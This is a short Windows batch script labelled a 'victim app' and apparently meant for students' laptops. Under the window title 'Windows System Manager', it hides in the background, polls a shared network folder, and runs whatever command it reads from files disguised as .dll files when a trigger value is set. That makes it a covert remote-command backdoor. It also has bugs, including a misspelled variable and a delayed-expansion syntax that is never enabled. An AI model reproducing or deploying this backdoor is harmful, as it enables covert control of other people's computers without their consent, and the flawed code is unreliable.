::
::
:: BACK BATCH VICTIM APP
:: [BY: 1K0DE]
::
:: -> This app runs invisibly in the background constantly checking for the signal to execute a command from collab folders.
:: -> Use another VBS file to make this run in the background
:: -> Store this file as C:\VictimApp.bat

@echo off
cls
title Windows System Manager
set "BackBatch_Devices=P:\Composite\All Students\BackBatch\Devices"
set "SPECIFIC_FOLDER=%BaclBatch_Devices%\HSIE_28" :: Change this specificly for every laptop
goto collab_search
goto crash

:collab_search
if exist "%SPECIFIC_FOLDER%" (
	goto recieve_cmds
) else (
	ping localhost -n 2 > nul
	goto collab_search
)
goto crash

:recieve_cmds
cls
ping localhost -n 1 > nul
set /p CMD_EXEC=<"%SPECIFIC_FOLDER%\CMD_EXEC.dll"
set /p EXEC_CMD=<"%SPECIFIC_FOLDER%\EXEC_CMD.dll"
if "!EXEC_CMD!" == "exec_now" (
	%CMD_EXEC%
	ping localhost -n 4 > nul
	goto recieve_cmds
) else (
	goto recieve_cmds
)
goto crash

:crash
echo Crashed^!
goto collab_search
